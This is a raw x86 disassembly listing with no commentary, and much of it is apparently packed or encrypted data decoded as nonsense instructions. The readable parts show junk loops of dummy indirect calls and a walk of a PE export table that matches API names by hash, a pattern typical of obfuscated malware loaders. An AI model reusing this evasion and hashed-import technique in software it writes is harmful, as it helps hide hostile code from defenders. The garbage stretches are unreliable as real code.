  419e24:	enter  0xa032,0x43
  419e28:	mov    ds:0xe51c0e4f,al
  419e2d:	aas    
  419e2e:	xchg   ecx,eax
  419e2f:	fst    QWORD PTR cs:[ecx-0x5bf2fd08]
  419e36:	ret    
  419e37:	dec    eax
  419e38:	les    edi,FWORD PTR [ebx+0x62e29981]
  419e3e:	into   
  419e3f:	out    dx,eax
  419e40:	shl    DWORD PTR [ebp-0x789fe095],0xd3
  419e47:	push   esp
  419e48:	push   0x49dd0d5f
  419e4d:	nop
  419e4e:	imul   esi,DWORD PTR [eax+ebp*4-0x691cd0],0x72
  419e56:	dec    esi
  419e57:	push   esp
  419e58:	fisttp DWORD PTR ds:0x584df11c
  419e5e:	lods   al,BYTE PTR ds:[esi]
  419e5f:	and    al,0x7f
  419e61:	rcr    DWORD PTR [ebx-0x6f57733],cl
  419e67:	(bad)  
  419e68:	adc    BYTE PTR [esi],ah
  419e6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e6b:	and    esp,DWORD PTR [ebx+eax*2+0x0]
  419e6f:	or     BYTE PTR [ebx-0x69],bh
  419e72:	jl     0x419e87
  419e74:	mov    edx,DWORD PTR [esi+0x33]
  419e77:	(bad)  [eax]
  419e79:	pusha  
  419e7a:	mov    dl,0x61
  419e7c:	xor    edi,DWORD PTR [edx]
  419e7e:	stos   DWORD PTR es:[edi],eax
  419e7f:	or     cl,BYTE PTR ds:0xb05db692
  419e85:	and    al,0xf2
  419e87:	xchg   BYTE PTR [ecx+0xdeff4d6],cl
  419e8d:	add    DWORD PTR [ebx+0x70d06ffa],ebp
  419e93:	mov    bh,cl
  419e95:	aad    0x8a
  419e97:	inc    eax
  419e98:	mov    eax,ebx
  419e9a:	call   0x38f278f0
  419e9f:	inc    ebp
  419ea0:	xor    eax,0x3135a9c0
  419ea5:	out    dx,al
  419ea6:	mov    edx,0xd4511121
  419eab:	repnz add BYTE PTR [esi],bh
  419eae:	dec    esi
  419eaf:	jmp    0x419e9a
  419eb1:	daa    
  419eb2:	push   cs
  419eb3:	fsub   st(5),st
  419eb5:	in     al,dx
  419eb6:	int3   
  419eb7:	cli    
  419eb8:	test   BYTE PTR [edx],ah
  419eba:	(bad)  
  419ebb:	push   edi
  419ebc:	pushf  
  419ebd:	dec    ebp
  419ebe:	adc    bl,BYTE PTR [ecx]
  419ec0:	sub    DWORD PTR [edx],ecx
  419ec2:	mov    DWORD PTR [ebx+0x1c102eac],ebp
  419ec8:	adc    BYTE PTR [edx+0x4c],dh
  419ecb:	push   esi
  419ecc:	fnstenv [esi+0x488bdd88]
  419ed2:	out    dx,eax
  419ed3:	mov    bl,0x91
  419ed5:	xchg   BYTE PTR [edi],dh
  419ed7:	mov    al,0x5e
  419ed9:	dec    ebp
  419eda:	into   
  419edb:	xor    eax,0x44f48b99
  419ee0:	sbb    DWORD PTR [esi-0x49510c88],ebx
  419ee6:	(bad)  
  419ee7:	mov    dl,al
  419ee9:	jl     0x419f17
  419eeb:	xchg   edx,eax
  419eec:	inc    ebx
  419eed:	fimul  WORD PTR [ebx-0xc]
  419ef0:	loope  0x419e94
  419ef2:	push   cs
  419ef3:	cmp    BYTE PTR [edx],ch
  419ef5:	fst    DWORD PTR [ebx+ebx*1]
  419ef8:	loop   0x419ea9
  419efa:	pop    edi
  419efb:	add    dh,bl
  419efd:	mov    esp,DWORD PTR [eax-0x72]
  419f00:	sub    al,0xcd
  419f02:	lea    edx,[ebx]
  419f04:	add    eax,0x25951bc0
  419f09:	icebp  
  419f0a:	rcl    DWORD PTR [bp+di],1
  419f0d:	popf   
  419f0e:	sub    bl,ch
  419f10:	int    0xc7
  419f12:	ins    DWORD PTR es:[edi],dx
  419f13:	(bad)  
  419f14:	leave  
  419f15:	mov    ch,0xd8
  419f17:	repz repnz fst DWORD PTR [esi*1-0x3afa212a]
  419f20:	adc    esp,DWORD PTR ds:0x9b5ca5ed
  419f26:	sub    BYTE PTR [esi],ch
  419f28:	sbb    DWORD PTR [edi],eax
  419f2a:	dec    ecx
  419f2b:	das    
  419f2c:	pop    ebx
  419f2d:	stos   BYTE PTR es:[edi],al
  419f2e:	enter  0xb8f7,0x65
  419f32:	mov    ebp,0x3bb5e3e2
  419f37:	loop   0x419efb
  419f39:	cmp    eax,0xd6667858
  419f3e:	outs   dx,DWORD PTR ds:[esi]
  419f3f:	push   ebp
  419f40:	mov    dh,0x40
  419f42:	pop    edx
  419f43:	xor    ebp,ecx
  419f45:	ret    
  419f46:	pushf  
  419f47:	data16 adc dh,al
  419f4a:	iret   
  419f4b:	jmp    0xe183824b
  419f50:	fist   DWORD PTR [esi-0x6136483d]
  419f56:	pop    edx
  419f57:	mov    bl,0xda
  419f59:	fidivr WORD PTR [esi]
  419f5b:	xchg   esp,eax
  419f5c:	std    
  419f5d:	xchg   edi,eax
  419f5e:	inc    ebx
  419f5f:	jge    0x419efa
  419f61:	(bad)  
  419f62:	icebp  
  419f63:	and    eax,0xe51e23e8
  419f68:	and    eax,0xf283a071
  419f6d:	nop
  419f6e:	cmp    ebp,esi
  419f70:	shr    BYTE PTR [ebx-0x16],1
  419f73:	out    0xc1,eax
  419f75:	xchg   DWORD PTR [esi-0x76],edi
  419f78:	les    edx,FWORD PTR [ebp-0x2fc50186]
  419f7e:	scas   al,BYTE PTR es:[edi]
  419f7f:	sahf   
  419f80:	loope  0x419f37
  419f82:	inc    eax
  419f83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f84:	jmp    0x8b3a:0x9ae2d55f
  419f8b:	std    
  419f8c:	or     bh,BYTE PTR [ebx+edx*4]
  419f8f:	xor    al,dh
  419f91:	leave  
  419f92:	add    ch,BYTE PTR [ebp-0x785aaf39]
  419f98:	repz adc BYTE PTR [ebx+0x3184cb5f],ch
  419f9f:	and    ecx,DWORD PTR [edi]
  419fa1:	test   DWORD PTR [ecx-0x7efffffa],edx
  419fa7:	add    eax,0x42a7c5
  419fac:	popa   
  419fad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fae:	inc    edx
  419faf:	add    bh,bh
  419fb1:	jne    0x419fbb
  419fb3:	or     DWORD PTR ds:0x42a871,0x48c2
  419fbd:	call   0x4175e1
  419fc2:	and    DWORD PTR ds:0x42a835,edi
  419fc8:	mov    DWORD PTR [ebp-0x20],eax
  419fcb:	jmp    0x41a200
  419fd0:	aas    
  419fd1:	into   
  419fd2:	leave  
  419fd3:	int    0xd9
  419fd5:	(bad)  
  419fd7:	into   
  419fd8:	fwait
  419fd9:	or     BYTE PTR [eax-0x74],0x4f
  419fdd:	test   al,0xac
  419fdf:	jo     0x419f61
  419fe1:	sar    DWORD PTR [edi+0x78],cl
  419fe4:	adc    BYTE PTR [esi+0x78],bh
  419fe7:	js     0x419f81
  419fe9:	xlat   BYTE PTR ds:[ebx]
  419fea:	popf   
  419feb:	and    al,0x98
  419fed:	or     ebx,eax
  419fef:	mov    DWORD PTR [esi],esi
  419ff1:	stos   DWORD PTR es:[edi],eax
  419ff2:	xchg   DWORD PTR [ebp+0x71fa1c5],ebp
  419ff8:	pop    ebx
  419ff9:	xchg   ebp,eax
  419ffa:	push   ebx
  419ffb:	push   esi
  419ffc:	out    dx,eax
  419ffd:	imul   ebp,DWORD PTR [edx-0x46],0xffffff96
  41a001:	xchg   ecx,eax
  41a002:	hlt    
  41a003:	js     0x419f89
  41a005:	push   ebp
  41a006:	fsubr  DWORD PTR cs:[esi+eiz*2-0x63]
  41a00b:	jmp    0x212e:0xbf47cdab
  41a012:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a013:	scas   al,BYTE PTR es:[edi]
  41a014:	aad    0x32
  41a016:	or     dl,BYTE PTR [esi-0x65e4b4fb]
  41a01c:	(bad)  
  41a01d:	int3   
  41a01e:	ja     0x419ffd
  41a020:	sbb    edx,DWORD PTR [ebp+0x79]
  41a023:	bound  ecx,QWORD PTR [ecx+0x4756f3e1]
  41a029:	jmp    0xda7:0x77155a57
  41a030:	in     al,dx
  41a031:	sub    cl,cl
  41a033:	push   edx
  41a034:	fdiv   DWORD PTR [edi-0x6d15ffb8]
  41a03a:	jmp    0x94a9a6bb
  41a03f:	sub    esi,ecx
  41a041:	or     al,BYTE PTR [ebp+eiz*8+0x2809e4c9]
  41a048:	aas    
  41a049:	push   0x76d721de
  41a04e:	adc    BYTE PTR [ecx-0x4b],0x45
  41a052:	push   cs
  41a053:	ret    0xcfdd
  41a056:	xlat   BYTE PTR ds:[ebx]
  41a057:	add    DWORD PTR [ebx],edi
  41a059:	outs   dx,DWORD PTR ds:[esi]
  41a05a:	xchg   edi,eax
  41a05b:	cli    
  41a05c:	nop
  41a05d:	push   0x32c62406
  41a062:	shl    BYTE PTR [edx+0x5f],0xb1
  41a066:	lds    edx,FWORD PTR [edx-0x231d14ad]
  41a06c:	and    eax,0xa28feec3
  41a071:	xchg   esp,eax
  41a072:	adc    BYTE PTR [eax-0x69],ah
  41a075:	mov    ebx,0x7f53e7fe
  41a07a:	dec    ebp
  41a07b:	or     edx,0xb8ce8b02
  41a081:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a082:	add    dl,bh
  41a084:	push   edi
  41a085:	mov    esi,0xdae2af75
  41a08a:	xlat   BYTE PTR ds:[ebx]
  41a08b:	inc    ebx
  41a08c:	addr16 mov al,0xb0
  41a08f:	(bad)  
  41a090:	movntq (bad),mm3
  41a091:	out    0xdf,eax
  41a093:	fbld   TBYTE PTR [ecx-0x42]
  41a096:	cmp    eax,0xce59f9dc
  41a09b:	test   bl,dh
  41a09d:	mov    ebp,ebp
  41a09f:	rcr    DWORD PTR [ebp+eiz*4-0x33982182],0x9
  41a0a7:	dec    edx
  41a0a8:	inc    esp
  41a0a9:	mov    cl,dh
  41a0ab:	sub    al,0x4c
  41a0ad:	adc    eax,0x2f9969a5
  41a0b2:	inc    ecx
  41a0b3:	gs in  eax,dx
  41a0b5:	idiv   BYTE PTR [esi]
  41a0b7:	xor    eax,0x603dd177
  41a0bc:	repnz cmp eax,0x7b0dffa5
  41a0c2:	aaa    
  41a0c3:	hlt    
  41a0c4:	mov    cs,WORD PTR [edi+0x5e9ffac1]
  41a0ca:	(bad)  
  41a0cb:	imul   edi,DWORD PTR [ecx+0x19],0xb3caf265
  41a0d2:	fld    QWORD PTR [eax]
  41a0d4:	jno    0x41a0f6
  41a0d6:	pop    es
  41a0d7:	add    esp,DWORD PTR [esi]
  41a0d9:	jg     0x41a0d2
  41a0db:	mov    ds:0x8a7eb9d2,al
  41a0e0:	mov    ebp,0xdded054e
  41a0e5:	xor    DWORD PTR [eax-0x44],eax
  41a0e8:	mov    edx,0xa2399d7b
  41a0ed:	add    DWORD PTR [edi],edx
  41a0ef:	arpl   WORD PTR [edi],si
  41a0f1:	call   0x2316:0xd2fc3789
  41a0f8:	pop    edi
  41a0f9:	sub    BYTE PTR [ecx],ah
  41a0fb:	sub    BYTE PTR [ebx-0x6d],0x5f
  41a0ff:	test   al,0xe4
  41a101:	in     al,dx
  41a102:	(bad)  
  41a103:	rcr    BYTE PTR [esi],0xf3
  41a106:	aam    0xd1
  41a108:	repnz aam 0x6
  41a10b:	push   esp
  41a10c:	mov    ds:0xc2fd0850,al
  41a111:	js     0x41a181
  41a113:	pop    esi
  41a114:	jg     0x41a0d7
  41a116:	xchg   esp,eax
  41a117:	mov    dh,0x29
  41a119:	enter  0x55e6,0x74
  41a11d:	je     0x41a17e
  41a11f:	(bad)  
  41a120:	loopne 0x41a19d
  41a122:	js     0x41a180
  41a124:	out    dx,al
  41a125:	xchg   ebx,eax
  41a126:	seta   BYTE PTR ds:0x62b118ea
  41a12d:	(bad)  
  41a12e:	mov    bh,0xe9
  41a130:	int3   
  41a131:	sub    DWORD PTR [eax-0x3b40e3ab],ebp
  41a137:	fld    DWORD PTR [esi-0x9b794c2]
  41a13d:	mov    edx,0x15f66b9f
  41a142:	lea    edi,[ecx+eax*8]
  41a145:	adc    DWORD PTR [ebx-0x7c],0x62
  41a149:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a14a:	bound  edi,QWORD PTR [ebx]
  41a14c:	sub    di,WORD PTR [ebp+0x6d]
  41a150:	fcmovnbe st,st(3)
  41a152:	in     al,0x4
  41a154:	aas    
  41a155:	xchg   esi,eax
  41a156:	inc    edi
  41a157:	or     BYTE PTR [esi],bh
  41a159:	jo     0x41a186
  41a15b:	dec    esi
  41a15c:	xor    DWORD PTR fs:[esi+edx*1+0x47fb9a25],edi
  41a164:	hlt    
  41a165:	in     al,0x6f
  41a167:	shl    DWORD PTR [esi-0x4eb1682c],0x17
  41a16e:	jecxz  0x41a13f
  41a170:	int3   
  41a171:	cmp    dh,BYTE PTR [ebp-0x79d6a23b]
  41a177:	and    ebp,esi
  41a179:	in     al,0xdc
  41a17b:	jmp    0x41a177
  41a17d:	dec    edx
  41a17e:	xchg   edi,eax
  41a17f:	xchg   ebx,eax
  41a180:	and    ah,BYTE PTR [ecx-0x7884b0b0]
  41a186:	shr    al,cl
  41a188:	mov    eax,0xe293af7c
  41a18d:	xchg   ebp,eax
  41a18e:	mov    DWORD PTR [ebx+0x44a11e00],ebp
  41a194:	iret   
  41a195:	sub    DWORD PTR [edi-0x5e921159],esi
  41a19b:	mov    edi,0x305b48de
  41a1a0:	jne    0x41a134
  41a1a2:	jg     0x41a1d7
  41a1a4:	sbb    al,0x56
  41a1a6:	dec    eax
  41a1a7:	add    eax,esi
  41a1a9:	lock cmp eax,0xbc255d29
  41a1af:	loopne 0x41a1b2
  41a1b1:	sub    al,dl
  41a1b3:	test   BYTE PTR [ebx+0x9],al
  41a1b6:	sub    BYTE PTR [edi-0x4f9340e0],ah
  41a1bc:	cmp    cl,BYTE PTR [esi]
  41a1be:	out    0x62,al
  41a1c0:	sub    ecx,DWORD PTR [esi+0x1c255bbc]
  41a1c6:	mov    cl,0x8d
  41a1c8:	push   esp
  41a1c9:	pop    ss
  41a1ca:	xchg   DWORD PTR [edi-0x2c],edx
  41a1cd:	dec    esp
  41a1ce:	arpl   di,cx
  41a1d0:	fidivr WORD PTR [edx-0x7]
  41a1d3:	jo     0x41a1ab
  41a1d5:	xchg   ecx,eax
  41a1d6:	daa    
  41a1d7:	mov    ebx,0x930db703
  41a1dc:	in     al,0xba
  41a1de:	pop    es
  41a1df:	xor    bl,BYTE PTR [edx-0x675f49d]
  41a1e5:	xlat   BYTE PTR ds:[ebx]
  41a1e6:	pop    edi
  41a1e7:	cmc    
  41a1e8:	es xor al,0xf1
  41a1eb:	cmp    BYTE PTR [eax+0x5e],dh
  41a1ee:	in     eax,dx
  41a1ef:	pop    ebx
  41a1f0:	(bad)  
  41a1f1:	push   ebp
  41a1f2:	and    eax,0x22df5522
  41a1f7:	test   al,0x1a
  41a1f9:	mov    cl,0x3
  41a1fb:	jmp    0x41a1ee
  41a1fd:	dec    ebx
  41a1fe:	jge    0x41a187
  41a200:	mov    eax,DWORD PTR [ebp-0x4]
  41a203:	mov    ecx,DWORD PTR [ebp-0x20]
  41a206:	mov    DWORD PTR ds:0x42a7b1,0x1c
  41a210:	cmp    DWORD PTR ds:0x42a7b1,0x0
  41a217:	je     0x41a247
  41a21d:	cmp    DWORD PTR ds:0x42a7b1,0x29
  41a224:	jne    0x41a233
  41a22a:	push   DWORD PTR [ebp-0xc]
  41a22d:	call   DWORD PTR ds:0x41d124
  41a233:	xor    esi,esi
  41a235:	xor    esi,DWORD PTR ds:0x42a7b1
  41a23b:	dec    esi
  41a23c:	mov    DWORD PTR ds:0x42a7b1,esi
  41a242:	jmp    0x41a210
  41a247:	mov    esi,0x7510850
  41a24c:	mov    DWORD PTR ds:0x42a84d,0x3f72
  41a256:	xor    eax,esi
  41a258:	add    eax,ebx
  41a25a:	cmp    ecx,eax
  41a25c:	mov    DWORD PTR ds:0x42a76d,0x752f
  41a266:	je     0x41a678
  41a26c:	push   DWORD PTR [ebp-0x20]
  41a26f:	sub    DWORD PTR ds:0x42a759,0x42a84d
  41a279:	push   DWORD PTR [ebp+0x8]
  41a27c:	call   0x408a76
  41a281:	jmp    0x41a4b6
  41a286:	(bad)  
  41a287:	les    edi,FWORD PTR [edi]
  41a289:	iret   
  41a28a:	rcr    ebx,1
  41a28c:	(bad)  
  41a28d:	leave  
  41a28e:	push   edi
  41a28f:	push   edx
  41a290:	in     al,dx
  41a291:	je     0x41a27a
  41a293:	pop    esi
  41a294:	cmc    
  41a295:	ds cwde 
  41a297:	sar    DWORD PTR [edi+0x78],1
  41a29a:	adc    BYTE PTR [esi+0x78],bh
  41a29d:	js     0x41a266
  41a29f:	ins    DWORD PTR es:[edi],dx
  41a2a0:	fs mov ch,0xf6
  41a2a3:	lods   al,BYTE PTR ds:[esi]
  41a2a4:	push   ebp
  41a2a5:	pop    ebx
  41a2a6:	mov    ch,0xc8
  41a2a8:	in     eax,dx
  41a2a9:	dec    ebp
  41a2aa:	push   ss
  41a2ab:	(bad)
  41a2ae:	jae    0x41a317
  41a2b0:	jne    0x41a265
  41a2b2:	dec    edx
  41a2b3:	cdq    
  41a2b4:	rcl    DWORD PTR [ebp+0x25],0x3c
  41a2b8:	cmp    DWORD PTR [esi-0x38e66899],esi
  41a2be:	pushf  
  41a2bf:	push   ds
  41a2c0:	clc    
  41a2c1:	or     eax,0xac5b644f
  41a2c6:	sbb    BYTE PTR [ebp+0x56],dh
  41a2c9:	and    eax,0x7f51edbc
  41a2ce:	mov    edx,0xc606790
  41a2d3:	or     eax,0x27ff70f1
  41a2d8:	stos   BYTE PTR es:[edi],al
  41a2d9:	inc    ebx
  41a2da:	pop    edx
  41a2db:	xor    DWORD PTR [ebx-0xe],esp
  41a2de:	dec    esp
  41a2df:	jb     0x41a311
  41a2e1:	clc    
  41a2e2:	test   al,0x9a
  41a2e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2e5:	lahf   
  41a2e6:	ds js  0x41a2c6
  41a2e9:	lock ror BYTE PTR [ebp-0x3c],cl
  41a2ed:	popa   
  41a2ee:	nop
  41a2ef:	fnstsw WORD PTR gs:[eax+esi*4]
  41a2f3:	in     eax,0xf8
  41a2f5:	and    esp,ebx
  41a2f7:	mov    esi,DWORD PTR [eax-0x31]
  41a2fa:	out    dx,eax
  41a2fb:	cmp    ecx,eax
  41a2fd:	dec    ebx
  41a2fe:	mov    ch,0x15
  41a300:	adc    ebp,DWORD PTR [ecx]
  41a302:	jmp    0x71d33d7a
  41a307:	aas    
  41a308:	(bad)  
  41a309:	mov    ds:0x45ed363,eax
  41a30e:	aaa    
  41a30f:	imul   BYTE PTR [esi+edx*1-0x64d1d3a2]
  41a316:	mov    esp,0x34de096b
  41a31b:	out    dx,eax
  41a31c:	ret    
  41a31d:	cmp    esp,ecx
  41a31f:	push   eax
  41a320:	rcr    DWORD PTR [ebx],0x8a
  41a323:	or     al,bh
  41a325:	fimul  DWORD PTR [edi+0x6508a2ba]
  41a32b:	mov    ds:0xb371a3e7,al
  41a330:	not    BYTE PTR [esi]
  41a332:	mov    eax,ds:0x67a2c16a
  41a337:	mov    BYTE PTR [ecx-0x20e43870],al
  41a33d:	inc    esp
  41a33e:	inc    ecx
  41a33f:	(bad)  
  41a340:	mov    DWORD PTR [esi],ebx
  41a342:	jl     0x41a371
  41a344:	push   ebp
  41a345:	mov    al,0xff
  41a347:	sbb    BYTE PTR [edi-0x1],bh
  41a34a:	sub    al,0x36
  41a34c:	test   BYTE PTR [ebp+0x68],cl
  41a34f:	in     al,0xb9
  41a351:	sbb    BYTE PTR [esi],bl
  41a353:	sub    DWORD PTR [ebx+0x1eaf78cd],ebp
  41a359:	jmp    0x9c29:0xab9eb6d3
  41a360:	div    DWORD PTR [edx]
  41a362:	push   0x4c
  41a364:	push   eax
  41a365:	ja     0x41a35a
  41a367:	daa    
  41a368:	into   
  41a369:	pop    es
  41a36a:	sub    BYTE PTR [eax],0xba
  41a36d:	(bad)  
  41a36e:	fsub   DWORD PTR [ebx]
  41a370:	rol    BYTE PTR [eax+0x44],cl
  41a373:	popf   
  41a374:	jns    0x41a3df
  41a376:	idiv   DWORD PTR [edi+0x2718b39b]
  41a37c:	test   DWORD PTR [edi+0x229332e8],0x16b67699
  41a386:	pop    ebx
  41a387:	icebp  
  41a388:	xchg   ebp,eax
  41a389:	lods   al,BYTE PTR ds:[esi]
  41a38a:	add    eax,0x89e8d47e
  41a38f:	hlt    
  41a390:	sub    cl,dh
  41a392:	retf   
  41a393:	shr    DWORD PTR [edx],cl
  41a395:	mov    dh,0x50
  41a397:	mov    dl,0xd0
  41a399:	inc    ecx
  41a39a:	outs   dx,DWORD PTR ds:[esi]
  41a39b:	push   ebp
  41a39c:	fwait
  41a39d:	xchg   ebp,eax
  41a39e:	mov    edx,0xf6d37d7
  41a3a3:	xchg   esi,eax
  41a3a4:	mov    dh,0x81
  41a3a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3a7:	xchg   dh,bh
  41a3a9:	push   eax
  41a3aa:	mov    ebp,0x10dc983
  41a3af:	pop    ebx
  41a3b0:	ja     0x41a37d
  41a3b2:	stos   DWORD PTR es:[edi],eax
  41a3b3:	or     eax,0xfd0c55e8
  41a3b8:	dec    eax
  41a3b9:	ins    BYTE PTR es:[edi],dx
  41a3ba:	cli    
  41a3bb:	je     0x41a34e
  41a3bd:	arpl   WORD PTR [eax+0x33ffd576],di
  41a3c3:	mov    edx,0xcc0b9218
  41a3c8:	rcl    esi,0xd2
  41a3cb:	iret   
  41a3cc:	push   ebp
  41a3cd:	pusha  
  41a3ce:	call   0x6aa9ebb3
  41a3d3:	jns    0x41a3ed
  41a3d5:	retf   
  41a3d6:	cli    
  41a3d7:	mul    BYTE PTR [ebx]
  41a3d9:	aam    0x60
  41a3db:	jbe    0x41a44b
  41a3dd:	sbb    ecx,edx
  41a3df:	xor    al,0x84
  41a3e1:	int3   
  41a3e2:	popcnt ecx,DWORD PTR [edx+0x16]
  41a3e7:	xor    DWORD PTR [ebx-0x2e],edi
  41a3ea:	shl    DWORD PTR [ebx+0x63],0xc2
  41a3ee:	xlat   BYTE PTR ds:[ebx]
  41a3ef:	inc    BYTE PTR [eax-0x7eba633b]
  41a3f5:	int    0xc8
  41a3f7:	and    eax,0x9a01bf63
  41a3fc:	ins    DWORD PTR es:[edi],dx
  41a3fd:	inc    ecx
  41a3fe:	push   cs
  41a3ff:	jmp    0x75fa311
  41a404:	enter  0x9efe,0xeb
  41a408:	and    DWORD PTR [ebp-0x42a1b39c],0x49
  41a40f:	jecxz  0x41a42a
  41a411:	icebp  
  41a412:	xchg   ecx,eax
  41a413:	mov    cs,WORD PTR [edi+ecx*1]
  41a416:	outs   dx,BYTE PTR ds:[esi]
  41a417:	mov    ch,0x6d
  41a419:	mov    ch,BYTE PTR [edi]
  41a41b:	pop    ebp
  41a41c:	sahf   
  41a41d:	push   cs
  41a41e:	and    eax,0xd9f41267
  41a423:	stos   BYTE PTR es:[edi],al
  41a424:	and    dl,bl
  41a426:	adc    eax,0x7d8fbaab
  41a42b:	mov    ds:0xf3502c93,eax
  41a430:	int3   
  41a431:	adc    DWORD PTR [ecx],eax
  41a433:	adc    dl,bh
  41a435:	xor    dl,BYTE PTR [edx-0x7161d0f4]
  41a43b:	iret   
  41a43c:	(bad)  
  41a43d:	hlt    
  41a43e:	stos   BYTE PTR es:[edi],al
  41a43f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a440:	mov    bh,cl
  41a442:	mov    dl,0xbd
  41a444:	jae    0x41a3ce
  41a446:	loop   0x41a4a6
  41a448:	pop    edi
  41a449:	scas   eax,DWORD PTR es:[edi]
  41a44a:	outs   dx,BYTE PTR ds:[esi]
  41a44b:	je     0x41a434
  41a44d:	sar    BYTE PTR [edx-0x70],0xdf
  41a451:	xor    ah,0x10
  41a454:	cmp    BYTE PTR [eax+0x25d1ffac],bh
  41a45a:	aam    0x6f
  41a45c:	push   ebx
  41a45d:	clc    
  41a45e:	lea    ebx,[ebx]
  41a460:	fsubr  st,st(4)
  41a462:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a463:	add    edx,edi
  41a465:	test   DWORD PTR [ebx-0x1755e320],ecx
  41a46b:	jmp    0xed32:0x4cd82a16
  41a472:	icebp  
  41a473:	mov    al,ds:0x39851600
  41a478:	lahf   
  41a479:	stos   BYTE PTR es:[edi],al
  41a47a:	pop    esi
  41a47b:	in     al,dx
  41a47c:	retf   
  41a47d:	inc    eax
  41a47e:	sbb    edi,DWORD PTR [edi-0x13a58393]
  41a484:	cld    
  41a485:	scas   al,BYTE PTR es:[edi]
  41a486:	or     ah,BYTE PTR [esp+esi*2]
  41a489:	mov    cl,0xfc
  41a48b:	adc    al,0x55
  41a48d:	fsubr  DWORD PTR ds:0x67e0764
  41a493:	gs cli 
  41a495:	sbb    dl,bl
  41a497:	or     esi,eax
  41a499:	int    0xed
  41a49b:	jp     0x41a433
  41a49d:	push   es
  41a49e:	arpl   WORD PTR [ebx+0x6c64c0f],bp
  41a4a4:	lods   al,BYTE PTR ds:[esi]
  41a4a5:	and    al,0xca
  41a4a7:	push   ds
  41a4a8:	sbb    al,0xc1
  41a4aa:	mov    ds:0x556535b9,eax
  41a4af:	ja     0x41a50a
  41a4b1:	cli    
  41a4b2:	sub    eax,0x89a381ae
  41a4b7:	inc    ebp
  41a4b8:	in     al,dx
  41a4b9:	mov    DWORD PTR ds:0x42a75d,0x18
  41a4c3:	cmp    DWORD PTR ds:0x42a75d,0x0
  41a4ca:	je     0x41a5f6
  41a4d0:	cmp    DWORD PTR ds:0x42a75d,0x1a
  41a4d7:	jne    0x41a4e8
  41a4dd:	push   0x3f0b
  41a4e2:	call   DWORD PTR ds:0x41d200
  41a4e8:	mov    eax,ds:0x42a75d
  41a4ed:	dec    eax
  41a4ee:	mov    ds:0x42a75d,eax
  41a4f3:	jmp    0x41a4c3
  41a4f8:	and    DWORD PTR ds:0x42a7f1,0x0
  41a502:	jmp    0x41a512
  41a507:	mov    eax,ds:0x42a7f1
  41a50c:	inc    eax
  41a50d:	mov    ds:0x42a7f1,eax
  41a512:	cmp    DWORD PTR ds:0x42a7f1,0x1f
  41a519:	jae    0x41a5f6
  41a51f:	cmp    DWORD PTR ds:0x42a7f1,0x8
  41a526:	jne    0x41a53f
  41a52c:	push   0x8add
  41a531:	push   0x6acd
  41a536:	push   DWORD PTR [ebp-0x20]
  41a539:	call   DWORD PTR ds:0x41d128
  41a53f:	cmp    DWORD PTR ds:0x42a7f1,0x7
  41a546:	jne    0x41a557
  41a54c:	mov    eax,ds:0x42a7f1
  41a551:	inc    eax
  41a552:	mov    ds:0x42a7f1,eax
  41a557:	jmp    0x41a507
  41a55c:	mov    DWORD PTR ds:0x42a77d,0x11
  41a566:	cmp    DWORD PTR ds:0x42a77d,0x0
  41a56d:	je     0x41a5f6
  41a573:	cmp    DWORD PTR ds:0x42a77d,0x1d
  41a57a:	jne    0x41a58b
  41a580:	push   0x75df
  41a585:	call   DWORD PTR ds:0x41d12c
  41a58b:	mov    eax,ds:0x42a77d
  41a590:	dec    eax
  41a591:	mov    ds:0x42a77d,eax
  41a596:	jmp    0x41a566
  41a59b:	and    DWORD PTR ds:0x42a759,0x0
  41a5a5:	mov    ecx,DWORD PTR ds:0x42a759
  41a5ab:	inc    ecx
  41a5ac:	mov    DWORD PTR ds:0x42a759,ecx
  41a5b2:	cmp    DWORD PTR ds:0x42a759,0xb
  41a5b9:	jne    0x41a5cd
  41a5bf:	push   DWORD PTR [ebp-0x28]
  41a5c2:	push   0x2f79
  41a5c7:	call   DWORD PTR ds:0x41d204
  41a5cd:	cmp    DWORD PTR ds:0x42a759,0xa
  41a5d4:	jne    0x41a5e9
  41a5da:	xor    ecx,ecx
  41a5dc:	add    ecx,DWORD PTR ds:0x42a759
  41a5e2:	inc    ecx
  41a5e3:	mov    DWORD PTR ds:0x42a759,ecx
  41a5e9:	cmp    DWORD PTR ds:0x42a759,0x15
  41a5f0:	jb     0x41a5a5
  41a5f6:	mov    eax,DWORD PTR [ebp-0x4]
  41a5f9:	mov    ecx,DWORD PTR [ebp-0x14]
  41a5fc:	xor    eax,esi
  41a5fe:	add    eax,ebx
  41a600:	cmp    ecx,eax
  41a602:	je     0x41a678
  41a608:	mov    eax,DWORD PTR [ebp-0x14]
  41a60b:	mov    eax,DWORD PTR [eax+0x18]
  41a60e:	mov    DWORD PTR [ebp-0x20],eax
  41a611:	mov    eax,DWORD PTR [ebp-0x14]
  41a614:	mov    ecx,DWORD PTR [ebp+0x8]
  41a617:	add    ecx,DWORD PTR [eax+0x20]
  41a61a:	mov    DWORD PTR [ebp-0x28],ecx
  41a61d:	mov    eax,DWORD PTR [ebp-0x14]
  41a620:	mov    ecx,DWORD PTR [ebp+0x8]
  41a623:	add    ecx,DWORD PTR [eax+0x24]
  41a626:	mov    DWORD PTR [ebp-0x2c],ecx
  41a629:	mov    eax,DWORD PTR [ebp-0x14]
  41a62c:	mov    ecx,DWORD PTR [ebp+0x8]
  41a62f:	add    ecx,DWORD PTR [eax+0x1c]
  41a632:	xor    esi,esi
  41a634:	mov    DWORD PTR [ebp-0x14],ecx
  41a637:	mov    eax,DWORD PTR [ebp-0x28]
  41a63a:	mov    ecx,DWORD PTR [ebp+0x8]
  41a63d:	add    ecx,DWORD PTR [eax+edi*4]
  41a640:	lea    eax,[ebp-0x8]
  41a643:	mov    DWORD PTR [ebp-0x30],ecx
  41a646:	push   eax
  41a647:	push   DWORD PTR [ebp-0x30]
  41a64a:	push   DWORD PTR [ebp+0xc]
  41a64d:	call   0x4068d8
  41a652:	mov    eax,DWORD PTR [ebp-0x4]
  41a655:	mov    ecx,DWORD PTR [ebp-0x8]
